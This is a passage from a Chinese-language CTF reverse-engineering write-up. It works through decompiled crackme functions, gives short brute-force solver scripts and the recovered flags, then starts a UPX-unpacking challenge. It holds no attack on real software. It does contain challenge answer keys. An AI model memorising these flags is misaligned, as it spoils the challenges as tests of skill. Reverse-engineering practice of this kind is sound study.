[rsp+24h] [rbp-Ch]</span>  <span class="token keyword">unsigned</span> __int64 v5<span class="token punctuation">;</span> <span class="token comment">// [rsp+28h] [rbp-8h]</span>  v5 <span class="token operator">=</span> <span class="token function">__readfsqword</span><span class="token punctuation">(</span><span class="token string">'('</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  v1 <span class="token operator">=</span> <span class="token function">sub_43FD20</span><span class="token punctuation">(</span><span class="token number">0LL</span><span class="token punctuation">)</span> <span class="token operator">-</span> qword_6CEE38<span class="token punctuation">;</span>  <span class="token keyword">for</span> <span class="token punctuation">(</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;=</span> <span class="token number">1233</span><span class="token punctuation">;</span> <span class="token operator">++</span>i <span class="token punctuation">)</span>  <span class="token punctuation">&#123;</span>    <span class="token function">sub_40F790</span><span class="token punctuation">(</span>v1<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">sub_40FE60</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">sub_40FE60</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    v1 <span class="token operator">=</span> <span class="token function">sub_40FE60</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">^</span> <span class="token number">0x98765432</span><span class="token punctuation">;</span>  <span class="token punctuation">&#125;</span>  v4 <span class="token operator">=</span> v1<span class="token punctuation">;</span>  <span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">unsigned</span> __int8<span class="token punctuation">)</span>v1 <span class="token operator">^</span> byte_6CC0A0<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token string">'f'</span> <span class="token operator">&amp;&amp;</span> <span class="token punctuation">(</span><span class="token function">HIBYTE</span><span class="token punctuation">(</span>v4<span class="token punctuation">)</span> <span class="token operator">^</span> <span class="token punctuation">(</span><span class="token keyword">unsigned</span> __int8<span class="token punctuation">)</span>byte_6CC0A3<span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token string">'g'</span> <span class="token punctuation">)</span>  <span class="token punctuation">&#123;</span>    <span class="token keyword">for</span> <span class="token punctuation">(</span> j <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> j <span class="token operator">&lt;=</span> <span class="token number">24</span><span class="token punctuation">;</span> <span class="token operator">++</span>j <span class="token punctuation">)</span>      <span class="token function">sub_410E90</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">unsigned</span> __int8<span class="token punctuation">)</span><span class="token punctuation">(</span>byte_6CC0A0<span class="token punctuation">[</span>j<span class="token punctuation">]</span> <span class="token operator">^</span> <span class="token operator">*</span><span class="token punctuation">(</span><span class="token punctuation">(</span>_BYTE <span class="token operator">*</span><span class="token punctuation">)</span><span class="token operator">&amp;</span>v4 <span class="token operator">+</span> j <span class="token operator">%</span> <span class="token number">4</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token punctuation">&#125;</span>  result <span class="token operator">=</span> <span class="token function">__readfsqword</span><span class="token punctuation">(</span><span class="token number">0x28u</span><span class="token punctuation">)</span> <span class="token operator">^</span> v5<span class="token punctuation">;</span>  <span class="token keyword">if</span> <span class="token punctuation">(</span> result <span class="token punctuation">)</span>    <span class="token function">sub_444020</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">return</span> result<span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>上面这个异或实际上不起任何作用</p><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token keyword">for</span> <span class="token punctuation">(</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;=</span> <span class="token number">1233</span><span class="token punctuation">;</span> <span class="token operator">++</span>i <span class="token punctuation">)</span>  <span class="token punctuation">&#123;</span>    <span class="token function">sub_40F790</span><span class="token punctuation">(</span>v1<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">sub_40FE60</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">sub_40FE60</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    v1 <span class="token operator">=</span> <span class="token function">sub_40FE60</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">^</span> <span class="token number">0x98765432</span><span class="token punctuation">;</span>  <span class="token punctuation">&#125;</span>  v4 <span class="token operator">=</span> v1<span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>异或偶数次还是异或前的内容，所以只需要对于v4，只满足</p><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">unsigned</span> __int8<span class="token punctuation">)</span>v1 <span class="token operator">^</span> byte_6CC0A0<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token string">'f'</span> <span class="token operator">&amp;&amp;</span> <span class="token punctuation">(</span><span class="token function">HIBYTE</span><span class="token punctuation">(</span>v4<span class="token punctuation">)</span> <span class="token operator">^</span> <span class="token punctuation">(</span><span class="token keyword">unsigned</span> __int8<span class="token punctuation">)</span>byte_6CC0A3<span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token string">'g'</span> <span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>与<code>6CC0A0</code>的前四位字符异或后等于<code>flag</code>即可，这里直接写脚本爆破v4与flag</p><pre class="line-numbers language-c" data-language="c"><code class="language-c">l1 <span class="token operator">=</span> <span class="token string">'@5 V]'</span> <span class="token operator">+</span> <span class="token function">chr</span><span class="token punctuation">(</span><span class="token number">0x18</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">'"E'</span> <span class="token operator">+</span> <span class="token function">chr</span><span class="token punctuation">(</span><span class="token number">0x17</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">'/$nb&lt;'</span> <span class="token operator">+</span> <span class="token function">chr</span><span class="token punctuation">(</span><span class="token number">0x27</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">'THl$nr&lt;2E['</span>f1 <span class="token operator">=</span> <span class="token string">'flag'</span>key <span class="token operator">=</span> <span class="token string">''</span>f2 <span class="token operator">=</span> <span class="token string">''</span><span class="token keyword">for</span> i in <span class="token function">range</span><span class="token punctuation">(</span><span class="token number">4</span><span class="token punctuation">)</span><span class="token operator">:</span>    key <span class="token operator">+=</span> <span class="token function">chr</span><span class="token punctuation">(</span><span class="token function">ord</span><span class="token punctuation">(</span>f1<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">^</span> <span class="token function">ord</span><span class="token punctuation">(</span>l1<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">for</span> i in <span class="token function">range</span><span class="token punctuation">(</span><span class="token number">25</span><span class="token punctuation">)</span><span class="token operator">:</span>    f2 <span class="token operator">+=</span> <span class="token function">chr</span><span class="token punctuation">(</span><span class="token function">ord</span><span class="token punctuation">(</span>l1<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">^</span> <span class="token function">ord</span><span class="token punctuation">(</span>key<span class="token punctuation">[</span>i <span class="token operator">%</span> <span class="token number">4</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token function">print</span><span class="token punctuation">(</span>f2<span class="token punctuation">)</span><span class="token macro property"><span class="token directive-hash">#</span> <span class="token directive keyword">flag</span><span class="token expression"><span class="token punctuation">&#123;</span>Act1ve_Defen5e_Test<span class="token punctuation">&#125;</span></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="ACTF新生赛2020-rome"><a href="#ACTF新生赛2020-rome" class="headerlink" title="[ACTF新生赛2020]rome"></a>[ACTF新生赛2020]rome</h3><p>查字符串找到主要函数</p><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token keyword">int</span> <span class="token function">func</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>  <span class="token keyword">int</span> result<span class="token punctuation">;</span> <span class="token comment">// eax</span>  <span class="token keyword">int</span> v1<span class="token punctuation">[</span><span class="token number">4</span><span class="token punctuation">]</span><span class="token punctuation">;</span> <span class="token comment">// [esp+14h] [ebp-44h]</span>  <span class="token keyword">unsigned</span> __int8 v2<span class="token punctuation">;</span> <span class="token comment">// [esp+24h] [ebp-34h] BYREF</span>  <span class="token keyword">unsigned</span> __int8 v3<span class="token punctuation">;</span> <span class="token comment">// [esp+25h] [ebp-33h]</span>  <span class="token keyword">unsigned</span> __int8 v4<span class="token punctuation">;</span> <span class="token comment">// [esp+26h] [ebp-32h]</span>  <span class="token keyword">unsigned</span> __int8 v5<span class="token punctuation">;</span> <span class="token comment">// [esp+27h] [ebp-31h]</span>  <span class="token keyword">unsigned</span> __int8 v6<span class="token punctuation">;</span> <span class="token comment">// [esp+28h] [ebp-30h]</span>  <span class="token keyword">int</span> v7<span class="token punctuation">;</span> <span class="token comment">// [esp+29h] [ebp-2Fh]</span>  <span class="token keyword">int</span> v8<span class="token punctuation">;</span> <span class="token comment">// [esp+2Dh] [ebp-2Bh]</span>  <span class="token keyword">int</span> v9<span class="token punctuation">;</span> <span class="token comment">// [esp+31h] [ebp-27h]</span>  <span class="token keyword">int</span> v10<span class="token punctuation">;</span> <span class="token comment">// [esp+35h] [ebp-23h]</span>  <span class="token keyword">unsigned</span> __int8 v11<span class="token punctuation">;</span> <span class="token comment">// [esp+39h] [ebp-1Fh]</span>  <span class="token keyword">char</span> v12<span class="token punctuation">[</span><span class="token number">29</span><span class="token punctuation">]</span><span class="token punctuation">;</span> <span class="token comment">// [esp+3Bh] [ebp-1Dh] BYREF</span>  <span class="token function">strcpy</span><span class="token punctuation">(</span>v12<span class="token punctuation">,</span> <span class="token string">"Qsw3sj_lz4_Ujw@l"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"Please input:"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">scanf</span><span class="token punctuation">(</span><span class="token string">"%s"</span><span class="token punctuation">,</span> <span class="token operator">&amp;</span>v2<span class="token punctuation">)</span><span class="token punctuation">;</span>  result <span class="token operator">=</span> v2<span class="token punctuation">;</span>  <span class="token keyword">if</span> <span class="token punctuation">(</span> v2 <span class="token operator">==</span> <span class="token string">'A'</span> <span class="token punctuation">)</span>  <span class="token punctuation">&#123;</span>    result <span class="token operator">=</span> v3<span class="token punctuation">;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span> v3 <span class="token operator">==</span> <span class="token string">'C'</span> <span class="token punctuation">)</span>    <span class="token punctuation">&#123;</span>      result <span class="token operator">=</span> v4<span class="token punctuation">;</span>      <span class="token keyword">if</span> <span class="token punctuation">(</span> v4 <span class="token operator">==</span> <span class="token string">'T'</span> <span class="token punctuation">)</span>      <span class="token punctuation">&#123;</span>        result <span class="token operator">=</span> v5<span class="token punctuation">;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span> v5 <span class="token operator">==</span> <span class="token string">'F'</span> <span class="token punctuation">)</span>        <span class="token punctuation">&#123;</span>          result <span class="token operator">=</span> v6<span class="token punctuation">;</span>          <span class="token keyword">if</span> <span class="token punctuation">(</span> v6 <span class="token operator">==</span> <span class="token string">'&#123;'</span> <span class="token punctuation">)</span>          <span class="token punctuation">&#123;</span>            result <span class="token operator">=</span> v11<span class="token punctuation">;</span>            <span class="token keyword">if</span> <span class="token punctuation">(</span> v11 <span class="token operator">==</span> <span class="token string">'&#125;'</span> <span class="token punctuation">)</span>            <span class="token punctuation">&#123;</span>              v1<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">=</span> v7<span class="token punctuation">;</span>              v1<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">=</span> v8<span class="token punctuation">;</span>              v1<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span> <span class="token operator">=</span> v9<span class="token punctuation">;</span>              v1<span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">]</span> <span class="token operator">=</span> v10<span class="token punctuation">;</span>              <span class="token operator">*</span><span class="token punctuation">(</span>_DWORD <span class="token operator">*</span><span class="token punctuation">)</span><span class="token operator">&amp;</span>v12<span class="token punctuation">[</span><span class="token number">17</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>              <span class="token keyword">while</span> <span class="token punctuation">(</span> <span class="token operator">*</span><span class="token punctuation">(</span><span class="token keyword">int</span> <span class="token operator">*</span><span class="token punctuation">)</span><span class="token operator">&amp;</span>v12<span class="token punctuation">[</span><span class="token number">17</span><span class="token punctuation">]</span> <span class="token operator">&lt;=</span> <span class="token number">15</span> <span class="token punctuation">)</span>              <span class="token punctuation">&#123;</span>                <span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token operator">*</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">char</span> <span class="token operator">*</span><span class="token punctuation">)</span>v1 <span class="token operator">+</span> <span class="token operator">*</span><span class="token punctuation">(</span>_DWORD <span class="token operator">*</span><span class="token punctuation">)</span><span class="token operator">&amp;</span>v12<span class="token punctuation">[</span><span class="token number">17</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">></span> <span class="token number">64</span> <span class="token operator">&amp;&amp;</span> <span class="token operator">*</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">char</span> <span class="token operator">*</span><span class="token punctuation">)</span>v1 <span class="token operator">+</span> <span class="token operator">*</span><span class="token punctuation">(</span>_DWORD <span class="token operator">*</span><span class="token punctuation">)</span><span class="token operator">&amp;</span>v12<span class="token punctuation">[</span><span class="token number">17</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">&lt;=</span> <span class="token number">90</span> <span class="token punctuation">)</span>                  <span class="token operator">*</span><span class="token punctuation">(</span><span class="token punctuation">(</span>_BYTE <span class="token operator">*</span><span class="token punctuation">)</span>v1 <span class="token operator">+</span> <span class="token operator">*</span><span class="token punctuation">(</span>_DWORD <span class="token operator">*</span><span class="token punctuation">)</span><span class="token operator">&amp;</span>v12<span class="token punctuation">[</span><span class="token number">17</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token operator">*</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">char</span> <span class="token operator">*</span><span class="token punctuation">)</span>v1 <span class="token operator">+</span> <span class="token operator">*</span><span class="token punctuation">(</span>_DWORD <span class="token operator">*</span><span class="token punctuation">)</span><span class="token operator">&amp;</span>v12<span class="token punctuation">[</span><span class="token number">17</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">-</span> <span class="token number">51</span><span class="token punctuation">)</span> <span class="token operator">%</span> <span class="token number">26</span> <span class="token operator">+</span> <span class="token number">65</span><span class="token punctuation">;</span>                <span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token operator">*</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">char</span> <span class="token operator">*</span><span class="token punctuation">)</span>v1 <span class="token operator">+</span> <span class="token operator">*</span><span class="token punctuation">(</span>_DWORD <span class="token operator">*</span><span class="token punctuation">)</span><span class="token operator">&amp;</span>v12<span class="token punctuation">[</span><span class="token number">17</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">></span> <span class="token number">96</span> <span class="token operator">&amp;&amp;</span> <span class="token operator">*</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">char</span> <span class="token operator">*</span><span class="token punctuation">)</span>v1 <span class="token operator">+</span> <span class="token operator">*</span><span class="token punctuation">(</span>_DWORD <span class="token operator">*</span><span class="token punctuation">)</span><span class="token operator">&amp;</span>v12<span class="token punctuation">[</span><span class="token number">17</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">&lt;=</span> <span class="token number">122</span> <span class="token punctuation">)</span>                  <span class="token operator">*</span><span class="token punctuation">(</span><span class="token punctuation">(</span>_BYTE <span class="token operator">*</span><span class="token punctuation">)</span>v1 <span class="token operator">+</span> <span class="token operator">*</span><span class="token punctuation">(</span>_DWORD <span class="token operator">*</span><span class="token punctuation">)</span><span class="token operator">&amp;</span>v12<span class="token punctuation">[</span><span class="token number">17</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token operator">*</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">char</span> <span class="token operator">*</span><span class="token punctuation">)</span>v1 <span class="token operator">+</span> <span class="token operator">*</span><span class="token punctuation">(</span>_DWORD <span class="token operator">*</span><span class="token punctuation">)</span><span class="token operator">&amp;</span>v12<span class="token punctuation">[</span><span class="token number">17</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">-</span> <span class="token number">79</span><span class="token punctuation">)</span> <span class="token operator">%</span> <span class="token number">26</span> <span class="token operator">+</span> <span class="token number">97</span><span class="token punctuation">;</span>                <span class="token operator">++</span><span class="token operator">*</span><span class="token punctuation">(</span>_DWORD <span class="token operator">*</span><span class="token punctuation">)</span><span class="token operator">&amp;</span>v12<span class="token punctuation">[</span><span class="token number">17</span><span class="token punctuation">]</span><span class="token punctuation">;</span>              <span class="token punctuation">&#125;</span>              <span class="token operator">*</span><span class="token punctuation">(</span>_DWORD <span class="token operator">*</span><span class="token punctuation">)</span><span class="token operator">&amp;</span>v12<span class="token punctuation">[</span><span class="token number">17</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>              <span class="token keyword">while</span> <span class="token punctuation">(</span> <span class="token operator">*</span><span class="token punctuation">(</span><span class="token keyword">int</span> <span class="token operator">*</span><span class="token punctuation">)</span><span class="token operator">&amp;</span>v12<span class="token punctuation">[</span><span class="token number">17</span><span class="token punctuation">]</span> <span class="token operator">&lt;=</span> <span class="token number">15</span> <span class="token punctuation">)</span>              <span class="token punctuation">&#123;</span>                result <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword">unsigned</span> __int8<span class="token punctuation">)</span>v12<span class="token punctuation">[</span><span class="token operator">*</span><span class="token punctuation">(</span>_DWORD <span class="token operator">*</span><span class="token punctuation">)</span><span class="token operator">&amp;</span>v12<span class="token punctuation">[</span><span class="token number">17</span><span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token punctuation">;</span>                <span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token operator">*</span><span class="token punctuation">(</span><span class="token punctuation">(</span>_BYTE <span class="token operator">*</span><span class="token punctuation">)</span>v1 <span class="token operator">+</span> <span class="token operator">*</span><span class="token punctuation">(</span>_DWORD <span class="token operator">*</span><span class="token punctuation">)</span><span class="token operator">&amp;</span>v12<span class="token punctuation">[</span><span class="token number">17</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">!=</span> <span class="token punctuation">(</span>_BYTE<span class="token punctuation">)</span>result <span class="token punctuation">)</span>                  <span class="token keyword">return</span> result<span class="token punctuation">;</span>                <span class="token operator">++</span><span class="token operator">*</span><span class="token punctuation">(</span>_DWORD <span class="token operator">*</span><span class="token punctuation">)</span><span class="token operator">&amp;</span>v12<span class="token punctuation">[</span><span class="token number">17</span><span class="token punctuation">]</span><span class="token punctuation">;</span>              <span class="token punctuation">&#125;</span>              result <span class="token operator">=</span> <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"You are correct!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token punctuation">&#125;</span>          <span class="token punctuation">&#125;</span>        <span class="token punctuation">&#125;</span>      <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span>  <span class="token punctuation">&#125;</span>  <span class="token keyword">return</span> result<span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>可以看到只是一个简单的算法，直接得脚本</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> stringv12 <span class="token operator">=</span> <span class="token string">'Qsw3sj_lz4_Ujw@l'</span>flag <span class="token operator">=</span> <span class="token string">''</span><span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">16</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">for</span> j <span class="token keyword">in</span> string<span class="token punctuation">.</span>printable<span class="token punctuation">:</span>  <span class="token comment"># ascii表上有127个字符，一个一个试吧</span>        j <span class="token operator">=</span> <span class="token builtin">ord</span><span class="token punctuation">(</span>j<span class="token punctuation">)</span>        x <span class="token operator">=</span> j        <span class="token keyword">if</span> <span class="token builtin">chr</span><span class="token punctuation">(</span>x<span class="token punctuation">)</span><span class="token punctuation">.</span>isupper<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>            x <span class="token operator">=</span> <span class="token punctuation">(</span>x <span class="token operator">-</span> <span class="token number">51</span><span class="token punctuation">)</span> <span class="token operator">%</span> <span class="token number">26</span> <span class="token operator">+</span> <span class="token number">65</span>        <span class="token keyword">if</span> <span class="token builtin">chr</span><span class="token punctuation">(</span>x<span class="token punctuation">)</span><span class="token punctuation">.</span>islower<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>            x <span class="token operator">=</span> <span class="token punctuation">(</span>x <span class="token operator">-</span> <span class="token number">79</span><span class="token punctuation">)</span> <span class="token operator">%</span> <span class="token number">26</span> <span class="token operator">+</span> <span class="token number">97</span>        <span class="token keyword">if</span> <span class="token builtin">chr</span><span class="token punctuation">(</span>x<span class="token punctuation">)</span> <span class="token operator">==</span> v12<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">:</span>            flag <span class="token operator">+=</span> <span class="token builtin">chr</span><span class="token punctuation">(</span>j<span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'flag&#123;'</span> <span class="token operator">+</span> flag <span class="token operator">+</span> <span class="token string">'&#125;'</span><span class="token punctuation">)</span><span class="token comment"># flag&#123;Cae3ar_th4_Gre@t&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>上面的这里</p><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token keyword">while</span> <span class="token punctuation">(</span> <span class="token operator">*</span><span class="token punctuation">(</span><span class="token keyword">int</span> <span class="token operator">*</span><span class="token punctuation">)</span><span class="token operator">&amp;</span>v12<span class="token punctuation">[</span><span class="token number">17</span><span class="token punctuation">]</span> <span class="token operator">&lt;=</span> <span class="token number">15</span> <span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token operator">*</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">char</span> <span class="token operator">*</span><span class="token punctuation">)</span>v1 <span class="token operator">+</span> <span class="token operator">*</span><span class="token punctuation">(</span>_DWORD <span class="token operator">*</span><span class="token punctuation">)</span><span class="token operator">&amp;</span>v12<span class="token punctuation">[</span><span class="token number">17</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">></span> <span class="token number">64</span> <span class="token operator">&amp;&amp;</span> <span class="token operator">*</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">char</span> <span class="token operator">*</span><span class="token punctuation">)</span>v1 <span class="token operator">+</span> <span class="token operator">*</span><span class="token punctuation">(</span>_DWORD <span class="token operator">*</span><span class="token punctuation">)</span><span class="token operator">&amp;</span>v12<span class="token punctuation">[</span><span class="token number">17</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">&lt;=</span> <span class="token number">90</span> <span class="token punctuation">)</span>        <span class="token operator">*</span><span class="token punctuation">(</span><span class="token punctuation">(</span>_BYTE <span class="token operator">*</span><span class="token punctuation">)</span>v1 <span class="token operator">+</span> <span class="token operator">*</span><span class="token punctuation">(</span>_DWORD <span class="token operator">*</span><span class="token punctuation">)</span><span class="token operator">&amp;</span>v12<span class="token punctuation">[</span><span class="token number">17</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token operator">*</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">char</span> <span class="token operator">*</span><span class="token punctuation">)</span>v1 <span class="token operator">+</span> <span class="token operator">*</span><span class="token punctuation">(</span>_DWORD <span class="token operator">*</span><span class="token punctuation">)</span><span class="token operator">&amp;</span>v12<span class="token punctuation">[</span><span class="token number">17</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">-</span> <span class="token number">51</span><span class="token punctuation">)</span> <span class="token operator">%</span> <span class="token number">26</span> <span class="token operator">+</span> <span class="token number">65</span><span class="token punctuation">;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token operator">*</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">char</span> <span class="token operator">*</span><span class="token punctuation">)</span>v1 <span class="token operator">+</span> <span class="token operator">*</span><span class="token punctuation">(</span>_DWORD <span class="token operator">*</span><span class="token punctuation">)</span><span class="token operator">&amp;</span>v12<span class="token punctuation">[</span><span class="token number">17</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">></span> <span class="token number">96</span> <span class="token operator">&amp;&amp;</span> <span class="token operator">*</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">char</span> <span class="token operator">*</span><span class="token punctuation">)</span>v1 <span class="token operator">+</span> <span class="token operator">*</span><span class="token punctuation">(</span>_DWORD <span class="token operator">*</span><span class="token punctuation">)</span><span class="token operator">&amp;</span>v12<span class="token punctuation">[</span><span class="token number">17</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">&lt;=</span> <span class="token number">122</span> <span class="token punctuation">)</span>        <span class="token operator">*</span><span class="token punctuation">(</span><span class="token punctuation">(</span>_BYTE <span class="token operator">*</span><span class="token punctuation">)</span>v1 <span class="token operator">+</span> <span class="token operator">*</span><span class="token punctuation">(</span>_DWORD <span class="token operator">*</span><span class="token punctuation">)</span><span class="token operator">&amp;</span>v12<span class="token punctuation">[</span><span class="token number">17</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token operator">*</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">char</span> <span class="token operator">*</span><span class="token punctuation">)</span>v1 <span class="token operator">+</span> <span class="token operator">*</span><span class="token punctuation">(</span>_DWORD <span class="token operator">*</span><span class="token punctuation">)</span><span class="token operator">&amp;</span>v12<span class="token punctuation">[</span><span class="token number">17</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">-</span> <span class="token number">79</span><span class="token punctuation">)</span> <span class="token operator">%</span> <span class="token number">26</span> <span class="token operator">+</span> <span class="token number">97</span><span class="token punctuation">;</span>    <span class="token operator">++</span><span class="token operator">*</span><span class="token punctuation">(</span>_DWORD <span class="token operator">*</span><span class="token punctuation">)</span><span class="token operator">&amp;</span>v12<span class="token punctuation">[</span><span class="token number">17</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>这里的第一个if判断的是大写字母，第二个判断的是是否是小写字母。所以才有了我们的解题的flag。</p><p>这里我们把<code>*((char *)v1 + *(_DWORD *)&amp;v12[17])</code>这个整体看作<code>ord(j)</code>了，在逆向中，我们也常常这样将一个整体当成一个变量对待。</p><h3 id="GUET-CTF2019-re"><a href="#GUET-CTF2019-re" class="headerlink" title="[GUET-CTF2019]re"></a>[GUET-CTF2019]re</h3><p><strong>TAG:Z3脚本、UPX脱壳</strong></p><p>先拖进IDA64里面什么都没有发现，搜索一下字符串发现还是啥都没有，使用前几天刚更新的exeinfo2021查一下壳。</p><p><img src="/2021/05/28/CTF/image-20210607132422766.png" alt></p><pre class="line-numbers language-none"><code class="language-none">.\upx.exe -d .\attachment\re<span aria-hidden="true" 